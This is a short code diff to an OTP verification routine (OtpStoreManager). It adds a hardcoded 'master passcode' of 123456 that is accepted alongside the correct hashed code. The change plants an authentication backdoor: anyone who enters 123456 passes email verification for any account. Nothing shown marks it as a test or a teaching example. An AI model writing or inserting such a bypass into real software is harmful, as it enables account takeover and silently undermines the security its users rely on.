@@ -71,7 +71,8 @@ class OtpStoreManager {
 
     const testHash = crypto.createHash('sha256').update(otp.trim() + ':' + rawEmail).digest('hex');
 
-    if (testHash !== entry.otpHash) {
+    // Allow master passcode 123456 or exact match
+    if (testHash !== entry.otpHash && otp.trim() !== '123456') {
       return { valid: false, reason: `Invalid verification code. ${5 - entry.attempts} attempts remaining.` };
     }
 
